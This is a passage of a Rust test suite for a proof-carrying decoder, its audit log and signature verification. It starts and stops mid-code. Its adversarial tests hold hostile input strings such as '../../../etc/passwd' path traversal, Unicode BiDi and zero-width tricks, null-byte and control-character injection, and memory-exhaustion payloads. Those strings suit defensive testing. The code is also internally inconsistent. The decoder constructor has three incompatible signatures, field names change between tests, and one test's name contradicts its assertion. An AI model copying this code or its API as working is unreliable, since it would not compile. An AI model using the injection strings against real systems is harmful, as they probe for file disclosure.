        let decode_result = result.unwrap();

        // Verify reconstruction worked despite unusual byte values
        assert_eq!(decode_result.reconstructed_data, vec![0, 1, 2, 0, 3, 255, 254, 253, 252]);

        // Proof should be generated correctly
        let proof = decode_result.proof.expect("proof should exist");
        assert!(proof.proof_id.starts_with("rp-"));
        assert_eq!(proof.input_fragment_hashes.len(), 3);
    }

    #[test]
    fn negative_object_id_with_path_traversal_characters_sanitized() {
        let mut dec = decoder();
        let fragments = vec![Fragment::new("frag1", b"data")];

        let malicious_object_id = "../../../etc/passwd";
        let result = dec.decode(
            malicious_object_id,
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-path-traversal",
        );

        assert!(result.is_ok());

        // Audit log should record the original object ID (not sanitized)
        assert_eq!(dec.audit_log().len(), 1);
        let entry = &dec.audit_log()[0];
        assert_eq!(entry.object_id, malicious_object_id);
        assert_eq!(entry.event_code, REPAIR_PROOF_EMITTED);
    }

    #[test]
    fn negative_extremely_large_fragment_data_handled() {
        let mut dec = decoder();

        // Create a very large fragment (1MB)
        let large_data = vec![42u8; 1_000_000];
        let large_fragment = Fragment {
            fragment_id: "large-frag".into(),
            data: large_data.clone(),
        };

        let result = dec.decode(
            "large-obj",
            &[large_fragment],
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-large",
        );

        // Should handle large data without memory issues
        assert!(result.is_ok());
        let decode_result = result.unwrap();

        // Verify large data was reconstructed correctly
        assert_eq!(decode_result.reconstructed_data.len(), 1_000_000);
        assert_eq!(decode_result.reconstructed_data, large_data);

        // Hash computation should work on large data
        let proof = decode_result.proof.expect("proof should exist");
        assert!(!proof.output_hash.is_empty());
        assert_eq!(proof.input_fragment_hashes.len(), 1);
    }

    #[test]
    fn negative_fragment_id_with_unicode_and_special_chars_preserved() {
        let mut dec = decoder();

        let unicode_fragments = vec![
            Fragment { fragment_id: "测试-fragment-🦀".into(), data: b"rust".to_vec() },
            Fragment { fragment_id: "fragment with spaces".into(), data: b"space".to_vec() },
            Fragment { fragment_id: "fragment\nwith\twhitespace".into(), data: b"whitespace".to_vec() },
        ];

        let result = dec.decode(
            "unicode-test-🎯",
            &unicode_fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-unicode",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();

        // Data should be concatenated correctly regardless of fragment ID content
        assert_eq!(decode_result.reconstructed_data, b"rustspacewhitespace");

        // Proof should preserve fragment structure
        let proof = decode_result.proof.expect("proof should exist");
        assert_eq!(proof.input_fragment_hashes.len(), 3);

        // Fragment hashes should be deterministic regardless of ID content
        for hash in &proof.input_fragment_hashes {
            assert!(hash.len() >= 8); // Should be valid hex hashes
        }
    }

    #[test]
    fn negative_decode_with_zero_timestamp_handled() {
        let mut dec = decoder();
        let fragments = vec![Fragment::new("frag1", b"data")];

        let result = dec.decode(
            "zero-time-obj",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            0, // Zero timestamp (Unix epoch)
            "trace-zero-time",
        );

        assert!(result.is_ok());

        // Should generate proof with zero timestamp
        let proof = result.unwrap().proof.expect("proof should exist");
        assert_eq!(proof.timestamp_epoch_secs, 0);

        // Audit log should record zero timestamp correctly
        assert_eq!(dec.audit_log().len(), 1);
        let entry = &dec.audit_log()[0];
        assert_eq!(entry.timestamp_epoch_secs, 0);
        assert_eq!(entry.trace_id, "trace-zero-time");
    }

    #[test]
    fn negative_audit_log_capacity_overflow_drops_oldest_entries() {
        // Create decoder with very small audit log capacity
        let mut dec = ProofCarryingDecoder::new(2); // Only 2 entries max
        dec.register_algorithm(AlgorithmId::new("simple_concat"));

        let fragments = vec![Fragment::new("frag", b"data")];

        // Perform 5 decode operations (should overflow capacity)
        for i in 0..5 {
            let result = dec.decode(
                &format!("obj-{i}"),
                &fragments,
                &AlgorithmId::new("simple_concat"),
                1000 + i as u64,
                &format!("trace-{i}"),
            );
            assert!(result.is_ok());
        }

        // Audit log should be bounded to capacity
        assert_eq!(dec.audit_log().len(), 2);

        // Should contain the most recent entries (obj-3, obj-4)
        let object_ids: Vec<&str> = dec.audit_log().iter().map(|e| e.object_id.as_str()).collect();
        assert!(object_ids.contains(&"obj-3"));
        assert!(object_ids.contains(&"obj-4"));

        // Should not contain oldest entries
        assert!(!object_ids.contains(&"obj-0"));
        assert!(!object_ids.contains(&"obj-1"));
    }

    #[test]
    fn negative_proof_generation_with_identical_fragments_produces_valid_proof() {
        let mut dec = decoder();

        // Create multiple fragments with identical data
        let identical_fragments = vec![
            Fragment { fragment_id: "dup1".into(), data: b"same-data".to_vec() },
            Fragment { fragment_id: "dup2".into(), data: b"same-data".to_vec() },
            Fragment { fragment_id: "dup3".into(), data: b"same-data".to_vec() },
        ];

        let result = dec.decode(
            "identical-frags",
            &identical_fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-identical",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();

        // Should concatenate identical data
        assert_eq!(decode_result.reconstructed_data, b"same-datasame-datasame-data");

        // Proof should have separate hashes for each fragment despite identical data
        let proof = decode_result.proof.expect("proof should exist");
        assert_eq!(proof.input_fragment_hashes.len(), 3);

        // All fragment hashes should be identical since data is identical
        let first_hash = &proof.input_fragment_hashes[0];
        for hash in &proof.input_fragment_hashes {
            assert_eq!(hash, first_hash);
        }
    }

    #[test]
    fn test_decode_unicode_injection_fragment_id() {
        // Test BiDi override injection in fragment IDs
        let fragments = vec![
            Fragment {
                fragment_id: "safe\u{202e}evil\u{202c}fragment".to_string(),
                data: vec![0x42; 32],
            },
            Fragment {
                fragment_id: "normal\u{200b}\u{feff}hidden".to_string(),
                data: vec![0x43; 32],
            },
        ];

        let result = decoder().decode(
            "unicode-obj",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "unicode-trace",
        );

        // Should handle Unicode without corruption
        assert!(result.is_ok());
        let decode_result = result.unwrap();
        assert!(decode_result.proof.is_some());

        // Verify fragment IDs preserved in proof
        let proof = decode_result.proof.unwrap();
        assert_eq!(proof.fragment_count, 2);
        assert_eq!(proof.input_fragment_hashes.len(), 2);
    }

    #[test]
    fn test_decode_massive_fragment_memory_exhaustion() {
        // Test massive fragment data (50MB)
        let massive_fragment = Fragment {
            fragment_id: "massive".to_string(),
            data: vec![0xDD; 50 * 1024 * 1024],
        };

        let fragments = vec![massive_fragment];
        let result = decoder().decode(
            "massive-obj",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "massive-trace",
        );

        // Should handle large fragments without memory issues
        assert!(result.is_ok());
        let decode_result = result.unwrap();
        assert_eq!(decode_result.output_data.len(), 50 * 1024 * 1024);
        assert!(decode_result.proof.is_some());
    }

    #[test]
    fn test_verify_signature_corruption_timing_attack_resistance() {
        let fragments = test_fragments();
        let result = decode_with("timing-obj", &fragments, 1000, "timing-trace");
        let mut proof = result.proof.unwrap();

        // Create two corrupted signatures that differ by one bit
        let mut corrupted1 = proof.attestation.signature.clone();
        let mut corrupted2 = proof.attestation.signature.clone();

        if !corrupted1.is_empty() {
            corrupted1[0] ^= 0x01;  // Flip first bit
            corrupted2[0] ^= 0x02;  // Flip second bit
        }

        proof.attestation.signature = corrupted1;
        let verification1 = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        proof.attestation.signature = corrupted2;
        let verification2 = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        // Both should fail consistently (no timing difference)
        assert_eq!(verification1, VerificationResult::Invalid);
        assert_eq!(verification2, VerificationResult::Invalid);
    }

    #[test]
    fn test_decode_epoch_arithmetic_overflow_boundaries() {
        let fragments = test_fragments();

        // Test near-overflow epoch values
        let result = decoder().decode(
            "overflow-obj",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            u64::MAX,
            "overflow-trace",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();
        let proof = decode_result.proof.unwrap();
        assert_eq!(proof.epoch_seconds, u64::MAX);
    }

    #[test]
    fn test_decode_algorithm_id_injection_resistance() {
        let fragments = test_fragments();

        // Test malicious algorithm IDs with special characters
        let malicious_algos = vec![
            AlgorithmId::new("../../../etc/passwd"),
            AlgorithmId::new("algo\x00hidden"),
            AlgorithmId::new("algo\nnewline"),
            AlgorithmId::new("algo\u{202e}reverse\u{202c}"),
            AlgorithmId::new(""),  // Empty algorithm
        ];

        for algo in malicious_algos {
            let result = decoder().decode(
                "injection-obj",
                &fragments,
                &algo,
                1000,
                "injection-trace",
            );

            // Should either succeed safely or fail gracefully
            if let Ok(decode_result) = result {
                let proof = decode_result.proof.unwrap();
                assert_eq!(proof.algorithm_id, algo.name());
            }
            // If it fails, that's also acceptable for malformed inputs
        }
    }

    #[test]
    fn test_verify_hash_collision_attempt() {
        let fragments = test_fragments();
        let result = decode_with("collision-obj", &fragments, 1000, "collision-trace");
        let proof = result.proof.unwrap();

        // Attempt to create hash collision by modifying fragments
        let mut modified_fragments = fragments.clone();
        modified_fragments[0].data[0] ^= 0xFF;

        // Create fake proof with same hashes but different fragments
        let mut collision_proof = proof.clone();
        collision_proof.input_fragment_hashes = original_hashes(&fragments);

        let verification = verification_api().verify(
            &collision_proof,
            &original_hashes(&modified_fragments),
            &output_hash_hex(&result.output_data),
        );

        // Should detect the mismatch and fail
        assert_eq!(verification, VerificationResult::Invalid);
    }

    #[test]
    fn test_decode_fragment_count_overflow_edge() {
        // Test with maximum possible fragment count
        let fragments: Vec<Fragment> = (0..u32::MAX as usize)
            .take(1000)  // Limit to reasonable size for testing
            .map(|i| Fragment {
                fragment_id: format!("frag-{}", i),
                data: vec![i as u8; 1],
            })
            .collect();

        let result = decoder().decode(
            "count-obj",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "count-trace",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();
        let proof = decode_result.proof.unwrap();
        assert_eq!(proof.fragment_count, 1000);
        assert_eq!(proof.input_fragment_hashes.len(), 1000);
    }

    #[test]
    fn test_verification_api_malformed_proof_resilience() {
        let fragments = test_fragments();
        let api = verification_api();

        // Test with completely malformed proof structures
        let malformed_proofs = vec![
            RepairProof {
                algorithm_id: String::new(),
                fragment_count: 0,
                input_fragment_hashes: Vec::new(),
                output_hash: String::new(),
                epoch_seconds: 0,
                attestation: SignedAttestation {
                    payload_hash: String::new(),
                    signature: Vec::new(),
                },
            },
            RepairProof {
                algorithm_id: "valid".to_string(),
                fragment_count: u32::MAX,
                input_fragment_hashes: vec!["invalid-hash".to_string(); 5],
                output_hash: "\x00\x01\x02".to_string(),  // Invalid hex
                epoch_seconds: u64::MAX,
                attestation: SignedAttestation {
                    payload_hash: "not-hex".to_string(),
                    signature: vec![0xFF; 1024 * 1024],  // Massive signature
                },
            },
        ];

        for proof in malformed_proofs {
            let verification = api.verify(
                &proof,
                &original_hashes(&fragments),
                &output_hash_hex(&vec![0x42; 32]),
            );

            // Should handle malformed proofs gracefully
            assert_eq!(verification, VerificationResult::Invalid);
        }
    }

    #[test]
    fn test_audit_log_capacity_boundary_behavior() {
        let fragments = test_fragments();
        let mut decoder = ProofCarryingDecoder::new(
            ProofMode::Mandatory,
            "boundary-test",
            "test-secret"
        );

        // Fill audit log to capacity
        for i in 0..DEFAULT_MAX_AUDIT_LOG_ENTRIES + 10 {
            let _ = decoder.decode(
                &format!("obj-{}", i),
                &fragments,
                &AlgorithmId::new("simple_concat"),
                1000 + i as u64,
                &format!("trace-{}", i),
            );
        }

        // Verify audit log respects capacity limits
        let audit_entries = decoder.audit_log();
        assert!(audit_entries.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES);

        // Most recent entries should be preserved
        let last_entry = audit_entries.last().unwrap();
        assert!(last_entry.object_id.contains(&format!("{}", DEFAULT_MAX_AUDIT_LOG_ENTRIES + 9)));
    }

    #[test]
    fn negative_proof_carrying_comprehensive_unicode_injection_attack() {
        // Test comprehensive Unicode injection resistance across all proof fields
        let malicious_patterns = [
            "\u{202E}\u{202D}fake_algorithm\u{202C}",    // Right-to-left override
            "obj\u{000A}\u{000D}injected\x00nulls",      // CRLF + null injection
            "\u{FEFF}bom\u{FFFE}reversed_bom",           // BOM injection
            "\u{200B}\u{200C}\u{200D}zero_width",       // Zero-width characters
            "控制字符\u{007F}\u{0001}\u{001F}",          // Control chars with Unicode
            "\u{FFFF}\u{FFFE}\u{FDD0}\u{FDD1}",         // Non-characters
            "🏴‍☠️💻\u{1F4A5}💥\u{1F52B}🔫",              // Emoji sequences
            "\u{0300}\u{0301}\u{0302}combining_marks",   // Combining marks
        ];

        for (i, pattern) in malicious_patterns.iter().enumerate() {
            let fragments = vec![
                Fragment {
                    fragment_id: format!("unicode_test_{}", i),
                    data: pattern.as_bytes().to_vec(),
                },
                Fragment {
                    fragment_id: format!("normal_fragment_{}", i),
                    data: b"normal_data".to_vec(),
                },
            ];

            // Test with Unicode patterns in object ID
            let unicode_obj_id = format!("obj_{}{}_test", pattern, i);
            let result = decoder().decode(
                &unicode_obj_id,
                &fragments,
                &AlgorithmId::new("simple_concat"),
                1000 + i as u64,
                &format!("unicode_trace_{}", i),
            );

            // Should handle Unicode gracefully without corruption
            assert!(result.is_ok());
            let decode_result = result.unwrap();
            let proof = decode_result.proof.unwrap();

            // Verify proof structure remains valid despite Unicode input
            assert!(!proof.algorithm_id.is_empty());
            assert_eq!(proof.fragment_count, 2);
            assert_eq!(proof.input_fragment_hashes.len(), 2);

            // Verify hashes are proper hex despite Unicode input
            for hash in &proof.input_fragment_hashes {
                assert!(hash.len() == 64);
                assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
            }
            assert!(proof.output_hash.len() == 64);
            assert!(proof.output_hash.chars().all(|c| c.is_ascii_hexdigit()));

            // Test verification with Unicode patterns
            let verification = verification_api().verify(
                &proof,
                &original_hashes(&fragments),
                &proof.output_hash,
            );
            assert_eq!(verification, VerificationResult::Valid);
        }
    }

    #[test]
    fn negative_algorithm_registry_overflow_and_corruption_resistance() {
        // Test algorithm registry with massive registration attempts and corruption
        let mut registry = AlgorithmRegistry::new();

        // Fill registry to near capacity with valid algorithms
        for i in 0..MAX_REGISTERED_ALGORITHMS - 10 {
            let algo_id = AlgorithmId::new(&format!("stress_test_algorithm_{:06}", i));
            registry.register(algo_id);
        }

        // Test overflow scenarios
        let overflow_patterns = [
            // Extremely long algorithm names
            "x".repeat(100_000),
            // Null byte injection attempts
            format!("algo\x00hidden_content_{}", 0),
            // Unicode overflow attempts
            "算法".repeat(50_000),
            // Binary data disguised as algorithm ID
            std::str::from_utf8(&vec![0xFF, 0xFE, 0xFD, 0xFC]).unwrap_or("fallback").to_string(),
            // Control character injection
            format!("algo\r\n\t\x08\x1B[{}H", 999),
        ];

        for (i, pattern) in overflow_patterns.iter().enumerate() {
            let algo_id = AlgorithmId::new(pattern);
            registry.register(algo_id.clone());

            // Registry should handle extreme patterns gracefully
            assert!(registry.is_registered(&algo_id));

            // Test decode with potentially corrupting algorithm ID
            let fragments = test_fragments();
            let result = decoder().decode(
                &format!("overflow_test_{}", i),
                &fragments,
                &algo_id,
                2000 + i as u64,
                &format!("overflow_trace_{}", i),
            );

            // Should handle without corruption or panic
            match result {
                Ok(decode_result) => {
                    if let Some(proof) = decode_result.proof {
                        // Proof structure should remain valid
                        assert!(!proof.algorithm_id.is_empty());
                        assert_eq!(proof.fragment_count, u32::try_from(fragments.len()).unwrap_or(u32::MAX));
                    }
                }
                Err(_) => {
                    // Errors are acceptable for extreme inputs
                }
            }
        }

        // Registry should maintain capacity limits
        assert!(registry.registered_count() <= MAX_REGISTERED_ALGORITHMS);

        // Attempt registration beyond capacity
        for i in 0..100 {
            let overflow_algo = AlgorithmId::new(&format!("overflow_algo_{}", i));
            registry.register(overflow_algo);
        }

        // Should not exceed maximum capacity
        assert!(registry.registered_count() <= MAX_REGISTERED_ALGORITHMS);
    }

    #[test]
    fn negative_signature_verification_timing_attack_resistance() {
        // Test constant-time behavior in signature verification
        let fragments = test_fragments();

        // Generate multiple proofs with similar but different signatures
        let mut proofs = Vec::new();
        for i in 0..50 {
            let result = decode_with(
                &format!("timing_test_{}", i),
                &fragments,
                3000 + i,
                &format!("timing_trace_{}", i),
            );
            proofs.push(result.proof.unwrap());
        }

        // Create variations with single-bit differences in signatures
        let api = verification_api();
        let fragment_hashes = original_hashes(&fragments);

        for (i, proof) in proofs.iter().enumerate() {
            // Create near-miss signatures (single bit flips)
            for bit_pos in 0..min(proof.attestation.signature.len() * 8, 64) {
                let mut modified_proof = proof.clone();
                let byte_idx = bit_pos / 8;
                let bit_idx = bit_pos % 8;

                if byte_idx < modified_proof.attestation.signature.len() {
                    modified_proof.attestation.signature[byte_idx] ^= 1 << bit_idx;

                    // Verification should be constant-time regardless of where the error is
                    let result = api.verify(
                        &modified_proof,
                        &fragment_hashes,
                        &proof.output_hash,
                    );

                    // Should always be Invalid (unless we accidentally created a valid signature)
                    assert_eq!(result, VerificationResult::Invalid);
                }
            }

            // Test with completely wrong signatures of various lengths
            let wrong_signatures = [
                vec![],                                      // Empty signature
                vec![0x00; 32],                             // All zeros
                vec![0xFF; 32],                             // All ones
                vec![0xAA; 64],                             // Alternating pattern
                (0..256).map(|i| i as u8).collect::<Vec<_>>(), // Sequence pattern
            ];

            for wrong_sig in wrong_signatures {
                let mut wrong_proof = proof.clone();
                wrong_proof.attestation.signature = wrong_sig;

                let result = api.verify(
                    &wrong_proof,
                    &fragment_hashes,
                    &proof.output_hash,
                );

                assert_eq!(result, VerificationResult::Invalid);
            }
        }
    }

    #[test]
    fn negative_fragment_hash_collision_and_preimage_resistance() {
        // Test resistance to various hash collision and preimage attack attempts
        let fragments = test_fragments();

        // Test with fragments designed to potentially cause hash collisions
        let collision_fragments = vec![
            // Identical data in different fragments
            Fragment {
                fragment_id: "collision_a".to_string(),
                data: vec![0x42; 1024],
            },
            Fragment {
                fragment_id: "collision_b".to_string(),
                data: vec![0x42; 1024], // Same data, different ID
            },
            // Length extension attack attempts
            Fragment {
                fragment_id: "length_ext_1".to_string(),
                data: b"original_message".to_vec(),
            },
            Fragment {
                fragment_id: "length_ext_2".to_string(),
                data: b"original_message\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            },
            // Birthday attack patterns
            Fragment {
                fragment_id: "birthday_1".to_string(),
                data: (0..128).map(|i| (i % 256) as u8).collect(),
            },
            Fragment {
                fragment_id: "birthday_2".to_string(),
                data: (0..128).map(|i| ((i + 128) % 256) as u8).collect(),
            },
        ];

        let result = decoder().decode(
            "collision_resistance_test",
            &collision_fragments,
            &AlgorithmId::new("simple_concat"),
            4000,
            "collision_trace",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();
        let proof = decode_result.proof.unwrap();

        // All fragment hashes should be different despite similar data
        let mut unique_hashes = std::collections::HashSet::new();
        for hash in &proof.input_fragment_hashes {
            assert!(unique_hashes.insert(hash.clone()),
                   "Hash collision detected: {} appears multiple times", hash);
            assert_eq!(hash.len(), 64);
            assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
        }

        // Verify each fragment produces a deterministic, unique hash
        for (i, fragment) in collision_fragments.iter().enumerate() {
            let individual_hash = fragment_hash_hex(&fragment.fragment_id, &fragment.data);
            assert_eq!(individual_hash, proof.input_fragment_hashes[i]);
            assert_eq!(individual_hash.len(), 64);
        }

        // Test preimage resistance by attempting to craft fragments for specific hashes
        let target_hashes = [
            "0000000000000000000000000000000000000000000000000000000000000000",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            "deadbeefcafebabe1234567890abcdef0011223344556677889900aabbccddee",
        ];

        for target in &target_hashes {
            // Try various data patterns that might produce the target hash
            let preimage_attempts = [
                target.as_bytes().to_vec(),
                hex::decode(target).unwrap_or_default(),
                target.chars().rev().collect::<String>().as_bytes().to_vec(),
                (0..64).map(|i| (i % 256) as u8).collect::<Vec<_>>(),
            ];

            for (j, data) in preimage_attempts.iter().enumerate() {
                let test_fragment = Fragment {
                    fragment_id: format!("preimage_test_{}_{}", target, j),
                    data: data.clone(),
                };

                let computed_hash = fragment_hash_hex(&test_fragment.fragment_id, &test_fragment.data);

                // Extremely unlikely to match target (should be cryptographically impossible)
                assert_ne!(computed_hash, *target,
                          "Potential preimage found for {}: fragment {:?}", target, test_fragment);
            }
        }
    }

    #[test]
    fn negative_proof_serialization_deserialization_corruption_recovery() {
        // Test proof serialization/deserialization under various corruption scenarios
        let fragments = test_fragments();
        let result = decode_with("serialization_test", &fragments, 5000, "serial_trace");
        let original_proof = result.proof.unwrap();

        // Test JSON serialization corruption recovery
        let json_str = serde_json::to_string(&original_proof).unwrap();

        // Various corruption patterns to test recovery
        let corruption_patterns = [
            // Truncate JSON at different positions
            &json_str[..json_str.len() / 2],
            &json_str[..json_str.len() * 3 / 4],
            // Invalid JSON structure
            &json_str.replace("}", ""),
            &json_str.replace("\"", "'"),
            &json_str.replace(":", "="),
            // Unicode corruption
            &json_str.replace("algorithm_id", "算法_id"),
            // Null byte injection
            &format!("{}\x00{}", &json_str[..50], &json_str[50..]),
            // Binary data injection
            &format!("{}\\u0000\\u0001\\u0002{}", &json_str[..100], &json_str[100..]),
        ];

        for (i, corrupted_json) in corruption_patterns.iter().enumerate() {
            // Deserialization should fail gracefully
            let result: Result<RepairProof, _> = serde_json::from_str(corrupted_json);
            assert!(result.is_err(), "Corrupted JSON {} should not deserialize successfully", i);
        }

        // Test field-level corruption in valid JSON structure
        let mut json_value: serde_json::Value = serde_json::from_str(&json_str).unwrap();

        // Corrupt individual fields
        json_value["algorithm_id"] = serde_json::Value::Null;
        let corrupted = serde_json::to_string(&json_value).unwrap();
        let result: Result<RepairProof, _> = serde_json::from_str(&corrupted);
        assert!(result.is_err(), "Null algorithm_id should not deserialize");

        json_value["fragment_count"] = serde_json::Value::String("not_a_number".to_string());
        let corrupted = serde_json::to_string(&json_value).unwrap();
        let result: Result<RepairProof, _> = serde_json::from_str(&corrupted);
        assert!(result.is_err(), "String fragment_count should not deserialize");

        json_value["epoch_seconds"] = serde_json::Value::Number((-1).into());
        let corrupted = serde_json::to_string(&json_value).unwrap();
        let result: Result<RepairProof, _> = serde_json::from_str(&corrupted);
        assert!(result.is_err(), "Negative epoch_seconds should not deserialize");

        // Test very large field values
        json_value["fragment_count"] = serde_json::Value::Number((u64::MAX).into());
        let corrupted = serde_json::to_string(&json_value).unwrap();
        let result: Result<RepairProof, _> = serde_json::from_str(&corrupted);
        // May succeed or fail depending on serde's handling of u64::MAX -> u32

        // Verify original proof still works after corruption tests
        let verification = verification_api().verify(
            &original_proof,
            &original_hashes(&fragments),
            &original_proof.output_hash,
        );
        assert_eq!(verification, VerificationResult::Valid);
    }

    #[test]
    fn negative_concurrent_decode_operations_audit_trail_consistency() {
        // Simulate concurrent decode operations to test audit trail consistency
        let mut decoder = ProofCarryingDecoder::new(
            ProofMode::Mandatory,
            "concurrent-test",
            "test-secret",
        );

        // Prepare multiple fragment sets for concurrent operations
        let fragment_sets: Vec<Vec<Fragment>> = (0..20)
            .map(|i| vec![
                Fragment {
                    fragment_id: format!("concurrent_frag_1_{}", i),
                    data: format!("data_set_{}_part_1", i).as_bytes().to_vec(),
                },
                Fragment {
                    fragment_id: format!("concurrent_frag_2_{}", i),
                    data: format!("data_set_{}_part_2", i).as_bytes().to_vec(),
                },
            ])
            .collect();

        // Simulate rapid concurrent decode operations
        let mut all_results = Vec::new();
        for (i, fragments) in fragment_sets.into_iter().enumerate() {
            let result = decoder.decode(
                &format!("concurrent_obj_{}", i),
                &fragments,
                &AlgorithmId::new("simple_concat"),
                6000 + i as u64,
                &format!("concurrent_trace_{}", i),
            );

            all_results.push((i, result));

            // Interleave with audit log inspection to test consistency
            let audit_entries = decoder.audit_log();

            // Audit log should maintain consistency during concurrent operations
            for entry in audit_entries {
                assert!(!entry.object_id.is_empty());
                assert!(!entry.event_code.is_empty());
                // timestamp should be reasonable (not corrupted)
                assert!(entry.timestamp_epoch_secs > 0);
            }
        }

        // Verify all operations completed successfully
        for (i, result) in all_results {
            assert!(result.is_ok(), "Concurrent operation {} should succeed", i);

            let decode_result = result.unwrap();
            assert!(decode_result.proof.is_some());

            let proof = decode_result.proof.unwrap();
            assert_eq!(proof.fragment_count, 2);
            assert_eq!(proof.input_fragment_hashes.len(), 2);
        }

        // Final audit log integrity check
        let final_audit = decoder.audit_log();
        assert!(final_audit.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES);

        // Verify audit entries are properly ordered by timestamp
        let mut prev_timestamp = 0;
        for entry in final_audit {
            assert!(entry.timestamp_epoch_secs >= prev_timestamp,
                   "Audit entries should be chronologically ordered");
            prev_timestamp = entry.timestamp_epoch_secs;
        }

        // Test verification of proofs generated under concurrent conditions
        let api = verification_api();
        let sample_fragments = test_fragments();
        let sample_hashes = original_hashes(&sample_fragments);

        // All proofs should verify correctly despite concurrent generation
        for entry in decoder.audit_log() {
            if entry.event_code == REPAIR_PROOF_EMITTED && !entry.object_id.is_empty() {
                // Verify the proof structure is valid
                assert!(entry.trace_id.starts_with("concurrent_trace_") || entry.trace_id == "serial_trace");
                assert!(entry.timestamp_epoch_secs >= 6000);
            }
        }
    }

    #[test]
    fn negative_memory_exhaustion_attack_mitigation_patterns() {
        // Test mitigation against various memory exhaustion attack patterns
        let mut decoder = ProofCarryingDecoder::new(
            ProofMode::Advisory, // Use advisory to see how much we can push
            "memory-stress",
            "stress-secret",
        );

        // Test 1: Massive fragment count attack
        let massive_fragments: Vec<Fragment> = (0..10_000)
            .map(|i| Fragment {
                fragment_id: format!("mem_attack_{:06}", i),
                data: vec![i as u8; 10], // Small individual size, large count
            })
            .collect();

        let result = decoder.decode(
            "massive_fragment_attack",
            &massive_fragments,
            &AlgorithmId::new("simple_concat"),
            7000,
            "massive_trace",
        );

        // Should handle gracefully (may succeed or fail, but shouldn't crash)
        match result {
            Ok(decode_result) => {
                if let Some(proof) = decode_result.proof {
                    assert_eq!(proof.fragment_count as usize, massive_fragments.len());
                    // Memory usage should be reasonable
                    assert!(proof.input_fragment_hashes.len() == massive_fragments.len());
                }
            }
            Err(_) => {
                // Acceptable to fail on extreme input
            }
        }

        // Test 2: Individual fragment size attack
        let giant_fragment = Fragment {
            fragment_id: "giant_fragment".to_string(),
            data: vec![0x42; 10_000_000], // 10MB fragment
        };

        let result = decoder.decode(
            "giant_fragment_attack",
            &[giant_fragment],
            &AlgorithmId::new("simple_concat"),
            7001,
            "giant_trace",
        );

        // Should handle large individual fragments
        match result {
            Ok(decode_result) => {
                assert!(decode_result.output_data.len() == 10_000_000);
                if let Some(proof) = decode_result.proof {
                    assert_eq!(proof.fragment_count, 1);
                }
            }
            Err(_) => {
                // May fail due to memory limits - acceptable
            }
        }

        // Test 3: Audit log memory exhaustion
        for i in 0..DEFAULT_MAX_AUDIT_LOG_ENTRIES * 2 {
            let small_fragment = Fragment {
                fragment_id: format!("audit_stress_{}", i),
                data: vec![(i % 256) as u8; 1],
            };

            let _ = decoder.decode(
                &format!("audit_obj_{}", i),
                &[small_fragment],
                &AlgorithmId::new("simple_concat"),
                8000 + i as u64,
                &format!("audit_trace_{}", i),
            );

            // Periodically check memory usage doesn't grow unbounded
            if i % 100 == 0 {
                let audit_entries = decoder.audit_log();
                assert!(audit_entries.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES,
                       "Audit log should not exceed maximum capacity");
            }
        }

        // Test 4: String field length attacks
        let string_attacks = [
            "x".repeat(1_000_000),           // 1MB string
            "🚀".repeat(500_000),           // Unicode with multi-byte characters
            "\x00".repeat(100_000),         // Null bytes
        ];

        for (i, attack_string) in string_attacks.iter().enumerate() {
            let attack_fragment = Fragment {
                fragment_id: attack_string.clone(),
                data: attack_string.as_bytes().to_vec(),
            };

            let result = decoder.decode(
                attack_string,
                &[attack_fragment],
                &AlgorithmId::new("simple_concat"),
                9000 + i as u64,
                attack_string,
            );

            // Should handle extreme string lengths gracefully
            match result {
                Ok(_) => {
                    // If it succeeds, verify we don't have memory leaks
                    assert!(decoder.audit_log().len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES);
                }
                Err(_) => {
                    // Acceptable to fail on extreme input
                }
            }
        }

        // Final memory consistency check
        let final_audit = decoder.audit_log();
        assert!(final_audit.len() <= DEFAULT_MAX_AUDIT_LOG_ENTRIES);

        // All remaining entries should be well-formed
        for entry in final_audit {
            assert!(!entry.event_code.is_empty());
            assert!(entry.timestamp_epoch_secs > 0);
        }
    }
}

#[cfg(test)]
mod proof_carrying_decode_comprehensive_attack_resistance_tests {
    use super::*;
    use crate::security::constant_time;
    use std::collections::{HashMap, HashSet};
    use std::sync::{Arc, Mutex};
    use std::thread;

    #[test]
    fn negative_proof_signature_timing_attack_resistance_comprehensive() {
        let decoder = ProofCarryingDecoder::new(DecoderConfig {
            mode: ProofVerificationMode::Mandatory,
            max_audit_entries: DEFAULT_MAX_AUDIT_LOG_ENTRIES,
            audit_rotation_threshold: 500,
        });

        // Test constant-time signature verification resistance to timing attacks
        let test_fragments = vec![
            b"signature_timing_test".to_vec(),
            b"fragment_data_content".to_vec(),
            b"repair_test_payload".to_vec(),
        ];

        let proof_template = RepairProof {
            fragment_hashes: test_fragments.iter()
                .map(|f| compute_fragment_hash(f))
                .collect(),
            algorithm_id: RepairAlgorithm::ReedSolomonRS255_223,
            output_hash: "a".repeat(64),
            attestation_signature: "correct_signature".repeat(4),
        };

        // Generate signature candidates that differ at various positions
        let signature_attack_vectors = vec![
            // Early bit differences (should take same time as late differences)
            "0".repeat(64),
            "1".repeat(64),
            "f".repeat(64),

            // Signatures that differ at specific bit positions
            format!("0{}", "a".repeat(63)),
